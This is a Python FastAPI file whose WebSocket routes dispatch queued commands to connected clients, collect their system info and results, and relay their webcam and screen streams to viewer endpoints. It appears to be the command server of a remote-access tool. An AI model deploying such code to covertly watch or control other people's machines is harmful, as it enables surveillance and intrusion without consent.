from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from connection_manager import manager
import asyncio

router = APIRouter()

@router.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await manager.connect(websocket, client_id)
    cmd_queue = manager.active_connections[client_id]["queue"]
    results_queue = manager.active_connections[client_id].get("results_queue")

    async def sender():
        while True:
            try:
                msg = await cmd_queue.get()
                await websocket.send_text(msg)
                cmd_queue.task_done()
            except (asyncio.CancelledError, WebSocketDisconnect):
                break
            except Exception:
                break

    sender_task = asyncio.create_task(sender())
    try:
        sysinfo = await websocket.receive_text()
        manager.update_client_info(client_id, sysinfo)
        while True:
            message = await websocket.receive()
            if "text" in message:
                print(f"\n--- Text from {client_id}: {message['text']} ---")
                if results_queue:
                    await results_queue.put(message['text'])
            elif "bytes" in message:
                data = message["bytes"]
                if not data:
                    continue
                stream_type = data[0]
                # We forward the ENTIRE packet, including the prefix byte
                if stream_type == 0x01:  # Webcam
                    await manager.forward_video_frame(data, client_id)
                elif stream_type == 0x02:  # Screen
                    await manager.forward_screen_frame(data, client_id)

    except (WebSocketDisconnect, RuntimeError):
        pass
    finally:
        sender_task.cancel()
        manager.disconnect(client_id)
        print(f"Cleanup for client {client_id} complete.")


@router.websocket("/ws/feed/{client_id}")
async def websocket_feed_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    manager.add_feed_viewer(websocket, client_id)
    try:
        # Passively wait for the client to disconnect.
        # This loop does nothing but keep the connection alive.
        while True:
            await asyncio.sleep(1)
    except WebSocketDisconnect:
        # This is the expected way for the connection to close.
        pass
    except Exception as e:
        print(f"Webcam feed error for {client_id}: {e}")
    finally:
        manager.remove_feed_viewer(websocket, client_id)
        print(f"Webcam viewer for {client_id} disconnected.")


@router.websocket("/ws/screenfeed/{client_id}")
async def websocket_screenfeed_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    manager.add_screen_viewer(websocket, client_id)
    try:
        # Passively wait for the client to disconnect.
        # This loop does nothing but keep the connection alive.
        while True:
            await asyncio.sleep(1)
    except WebSocketDisconnect:
        # This is the expected way for the connection to close.
        pass
    except Exception as e:
        print(f"Screen feed error for {client_id}: {e}")
    finally:
        manager.remove_screen_viewer(websocket, client_id)
        print(f"Screen viewer for {client_id} disconnected.")
